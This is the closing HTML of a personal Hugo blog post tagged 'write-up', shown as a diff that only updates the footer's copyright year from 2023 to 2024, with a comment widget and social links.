 </span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div><script src=https://giscus.app/client.js data-repo=chujDK/chujdk.github.io data-repo-id=R_kgDOI__mNg data-category=Announcements data-category-id=DIC_kwDOI__mNs4CYoyP data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
 <a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
 <a class=border></a><a class=soc href=mailto:chujj31@gmail.com rel=me title=Mail><i data-feather=mail></i></a>
 <a class=border></a><a class=soc href=https://www.cjovi.icu/index.xml rel=me title=Rss><i data-feather=rss></i></a>
-<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2023  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>
+<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2024  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>
